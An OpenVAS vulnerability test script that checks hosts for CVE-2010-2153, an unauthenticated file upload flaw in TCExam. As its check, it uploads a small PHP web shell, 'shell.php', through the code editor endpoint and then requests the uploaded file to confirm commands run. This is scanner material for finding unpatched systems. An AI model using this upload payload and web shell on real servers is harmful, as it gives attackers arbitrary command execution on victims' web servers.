##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_tcexam_file_upload_vuln.nasl 8457 2018-01-18 07:58:32Z teissa $
#
# TCExam 'tce_functions_tcecode_editor.php' File Upload Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
################################i###############################################

tag_impact = "Successful exploitation will allow attacker to upload PHP
scripts and execute arbitrary commands on a web server.

Impact Level: Application.";

tag_affected = "TCExam version 10.1.010 and prior";

tag_insight = "The flaw is due to the access and input validation errors in the
'/admin/code/tce_functions_tcecode_editor.php' script when uploading files.";

tag_solution = "Upgrade to TCExam version 10.1.012.
For updates refer to http://www.tecnick.com/public/code/cp_dpage.php?aiocp_dp=tcexam";

tag_summary = "This host is running TCExam and is prone to file upload
vulnerability.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.800793");
  script_version("$Revision: 8457 $");
  script_tag(name:"last_modification", value:"$Date: 2018-01-18 08:58:32 +0100 (Thu, 18 Jan 2018) $");
  script_tag(name:"creation_date", value:"2010-06-11 14:27:58 +0200 (Fri, 11 Jun 2010)");
  script_cve_id("CVE-2010-2153");
  script_bugtraq_id(40511);
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_name("TCExam 'tce_functions_tcecode_editor.php' File Upload Vulnerability");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/40011");
  script_xref(name : "URL" , value : "http://www.vupen.com/english/advisories/2010/1329");
  script_xref(name : "URL" , value : "http://cross-site-scripting.blogspot.com/2010/06/tcexam-101006-arbitrary-upload.html");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_tcexam_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("TCExam/installed");

  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

tcPort = get_http_port(default:80);

tcVer = get_kb_item("www/" + tcPort + "/TCExam");
if(!tcVer){
  exit(0);
}

tcVer = eregmatch(pattern:"^(.+) under (/.*)$", string:tcVer);
if(tcVer[2] != NULL)
{
  host = http_host_name(port:tcPort);

  ## Create a file called 'shell.php' and write the data into file
  content = string("------x\r\n",
                   "Content-Disposition: form-data; name='sendfile0'\r\n",
                   "\r\n",
                   "shell.php\r\n",
                   "------x\r\n",
                   "Content-Disposition: form-data; name='userfile0'; filename='shell.php'\r\n",
                   "Content-Type: application/octet-stream\r\n",
                   "\r\n",
                   "<?php echo '<pre>' + system($_GET['CMD']) + '</pre>'; ?>\r\n",
                   "------x--\r\n",
                   "\r\n");

 ## Construct the request to upload the file
 header = string("POST " + tcVer[2] + "/admin/code/tce_functions_tcecode_editor.php HTTP/1.1\r\n",
                  "Host: " + host + "\r\n",
                  "Proxy-Connection: keep-alive\r\n",
                  "User-Agent: " + OPENVAS_HTTP_USER_AGENT + "\r\n",
                  "Content-Length: " + strlen(content) + "\r\n",
                  "Cache-Control: max-age=0\r\n",
                  "Origin: null\r\n",
                  "Content-Type: multipart/form-data; boundary=----x\r\n",
                  "Accept: text/html\r\n",
                  "Accept-Encoding: gzip,deflate,sdch\r\n",
                  "Accept-Language: en-US,en;q=0.8\r\n",
                  "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n",
                  "Cookie: LastVisit=1275442604\r\n",
                  "\r\n");

  sndReq2 = header + content;
  rcvRes2 = http_keepalive_send_recv(port:tcPort, data:sndReq2);

  ## Construct the request to view the contents of 'cache/shell.php'
  sndReq = http_get(item:string(tcVer[2] , "/cache/shell.php"), port:tcPort);
  rcvRes = http_send_recv(port:tcPort, data:sndReq);
  if(!isnull(rcvRes))
  {
    ## Check the contents of the uploaded file(cache/shell.php)
    if("HTTP/1.1 200" >< rcvRes && "Cannot execute a blank command" >< rcvRes){
     security_message(tcPort);
    }
  }
}
